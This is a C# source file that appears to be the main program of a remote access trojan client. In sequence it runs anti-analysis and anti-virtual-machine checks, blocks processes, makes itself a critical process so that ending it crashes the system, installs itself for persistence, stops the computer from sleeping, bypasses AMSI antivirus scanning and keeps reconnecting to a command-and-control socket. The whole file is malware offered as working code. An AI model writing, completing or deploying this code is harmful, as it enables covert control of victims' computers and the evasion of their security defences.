using System.Threading;
using Client.Connection;
using Client.Install;
using System;
using Client.Helper;

namespace Client
{
    public class Program
    {
        public static void Main()
        {
            for (int i = 0; i < Convert.ToInt32(Settings.De_lay); i++)
            {
                Thread.Sleep(1000);
            }

            if (!Settings.InitializeSettings()) Environment.Exit(0);

            try
            {
                if (Convert.ToBoolean(Settings.An_ti)) //run anti-virtual environment
                    Anti_Analysis.RunAntiAnalysis();
                if (!MutexControl.CreateMutex()) //if current payload is a duplicate
                    Environment.Exit(0);
                if (Convert.ToBoolean(Settings.Anti_Process)) //run AntiProcess
                    AntiProcess.StartBlock();
                if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin()) //active critical process
                    ProcessCritical.Set();
                if (Convert.ToBoolean(Settings.In_stall)) //drop payload [persistence]
                    NormalStartup.Install();
                Methods.PreventSleep(); //prevent pc to idle\sleep
                
                if (Methods.IsAdmin())
                    Methods.ClearSetting();
                Amsi.Bypass();



            }
            catch { }

            while (true) // ~ loop to check socket status
            {
                try
                {
                    if (!ClientSocket.IsConnected)
                    {
                        ClientSocket.Reconnect();
                        ClientSocket.InitializeClient();
                    }
                }
                catch { }
                Thread.Sleep(5000);
            }
        }
    }
}